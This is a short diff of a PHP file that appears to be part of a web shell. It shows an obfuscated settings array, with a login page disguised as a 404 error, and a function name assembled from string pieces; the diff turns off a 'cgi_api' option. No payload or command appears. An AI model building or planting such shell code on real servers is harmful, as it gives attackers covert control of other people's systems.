@@ -13,7 +13,7 @@ $GLOBALS['oZgNypoPRU'] = array(
     'login_page' => '404',
     'show_icons' => '1',
     'post_encryption' => false,
-    'cgi_api' => true,
+    'cgi_api' => false,
 );
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
